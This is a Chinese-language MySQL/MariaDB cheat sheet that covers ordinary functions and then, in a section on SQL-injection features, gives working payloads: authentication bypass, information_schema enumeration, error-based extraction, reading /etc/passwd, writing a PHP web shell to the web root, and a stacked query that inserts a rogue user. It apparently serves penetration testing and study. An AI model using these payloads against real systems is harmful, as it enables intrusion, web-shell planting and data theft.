# MySQL / MariaDB

## 基本信息

- 开源关系型数据库
- 默认端口：3306
- 注释符：`-- `（注意后面有空格）、`#`（单行）、`/**/`（多行）
- 字符串连接符：`CONCAT()`；也可用空格隐式连接（`'a' 'b'`）
- 字符串定界符：单引号 `'`，双引号 `"`（取决于 `sql_mode`）

## 连接与基本操作

```bash
# 命令行连接
mysql -h <host> -u <user> -p

# 查看版本
SELECT VERSION();
SELECT @@version;

# 查看当前数据库
SELECT DATABASE();

# 查看当前用户
SELECT USER();
SELECT CURRENT_USER();
SELECT SYSTEM_USER();
```

## 查询系统信息

```sql
-- 列出所有数据库
SHOW DATABASES;
SELECT schema_name FROM information_schema.schemata;

-- 列出当前库的所有表
SHOW TABLES;
SELECT table_name FROM information_schema.tables WHERE table_schema='dbname';

-- 列出表中所有列
SHOW COLUMNS FROM users;
SELECT column_name, data_type FROM information_schema.columns 
WHERE table_name='users';

-- 查看用户
SELECT user, host FROM mysql.user;
```

## 常用函数

### 字符串操作

```sql
-- 取子字符串
SELECT SUBSTRING('hello', 1, 2);     -- 'he'
SELECT SUBSTR('hello', 1, 2);         -- 'he'（别名）
SELECT MID('hello', 1, 2);            -- 'he'（别名）

-- 字符串长度
SELECT LENGTH('hello');               -- 5（字节长度）
SELECT CHAR_LENGTH('hello');          -- 5（字符长度）

-- 字符串连接
SELECT CONCAT('a', 'b');              -- 'ab'
SELECT CONCAT_WS(',', 'a', 'b');      -- 'a,b'（带分隔符）
SELECT 'a' 'b';                       -- 'ab'（MySQL 特有隐式连接）

-- 大小写
SELECT UPPER('hello');                -- 'HELLO'
SELECT LOWER('HELLO');                -- 'hello'

-- 查找
SELECT INSTR('hello', 'll');          -- 3
SELECT LOCATE('ll', 'hello');         -- 3
```

### 类型转换

```sql
SELECT CAST('123' AS UNSIGNED);
SELECT CAST('123' AS SIGNED);
SELECT CONVERT('123', UNSIGNED);
```

### 时间函数

```sql
-- 延迟（有/无参数形式）
SELECT SLEEP(10);                    -- 延迟 10 秒
SELECT BENCHMARK(50000000, MD5('x'));-- CPU 密集型延迟

-- 当前时间
SELECT NOW();
SELECT CURRENT_TIMESTAMP();
```

### 条件表达式

```sql
SELECT IF(1=1, 'yes', 'no');
SELECT CASE WHEN 1=1 THEN 'yes' ELSE 'no' END;
```

## SQL 注入相关特性

### 注入点探测

```sql
-- 注释：MySQL 支持 # 作为注释（其他数据库通常不支持）
' OR '1'='1' #
' OR '1'='1' -- 

-- 注意：-- 后面必须有空格或控制符（--%20）
```

### 信息搜集（information_schema）

```sql
-- MySQL 注中标准的表搜集方式
SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()

-- 列搜集
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- 一次获取所有表.列（拼接导出）
SELECT GROUP_CONCAT(table_name, '.', column_name) FROM information_schema.columns WHERE table_schema=DATABASE()
```

### GROUP_CONCAT（多行合并）

MySQL 独有的聚合函数，盲注中极其常用：

```sql
SELECT GROUP_CONCAT(username) FROM users;
-- 返回：admin,guest,john（默认逗号分隔）

SELECT GROUP_CONCAT(username SEPARATOR ';') FROM users;
-- 返回：admin;guest;john
```

### 报错注入函数

MySQL 有丰富的报错注入函数，可在错误消息中直接泄露数据：

```sql
-- EXTRACTVALUE（最多 32 字符）
SELECT EXTRACTVALUE(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e));

-- UPDATEXML
SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT DATABASE()), 0x7e), 1);

-- FLOOR 随机数（需要 COUNT/GROUP BY 配合）
SELECT COUNT(*), CONCAT((SELECT DATABASE()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
```

### 文件操作（需要 FILE 权限）

```sql
-- 读文件
SELECT LOAD_FILE('/etc/passwd');

-- 写文件（INTO OUTFILE / INTO DUMPFILE）
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

### 多语句

依赖连接库是否开启多语句支持（如 PHP `mysqli_multi_query()`）：

```sql
'; INSERT INTO users VALUES('hacker', 'pass'); --
```

## 与其他数据库的关键区别

| 特性 | MySQL | PostgreSQL | Oracle | MSSQL |
|------|-------|-----------|--------|-------|
| 零行查询 | `SELECT 'x'` 可行 | `SELECT 'x'` 可行 | 必须 `FROM dual` | `SELECT 'x'` 可行 |
| 隐式字符串连接 | `'a' 'b'` = `'ab'` | 不支持 | 不支持 | 不支持 |
| 注释符 | `-- ` `#` `/**/` | `--` `/**/` | `--` `/**/` | `--` `/**/` |
| 多行合并 | `GROUP_CONCAT()` | `STRING_AGG()` / `ARRAY_TO_STRING()` | `LISTAGG()` | `STRING_AGG()` |
| 报错注入 | 极丰富（XPATH/FLOOR） | 较少 | 较少（`TO_CHAR(1/0)`） | 较多 |
| 文件读取 | `LOAD_FILE()` | `pg_read_file()`（需 superuser） | `UTL_FILE` 包 | `OPENROWSET` |
| 延迟 | `SLEEP(n)` / `BENCHMARK()` | `pg_sleep(n)` | `DBMS_PIPE.RECEIVE_MESSAGE('a',n)` | `WAITFOR DELAY` |
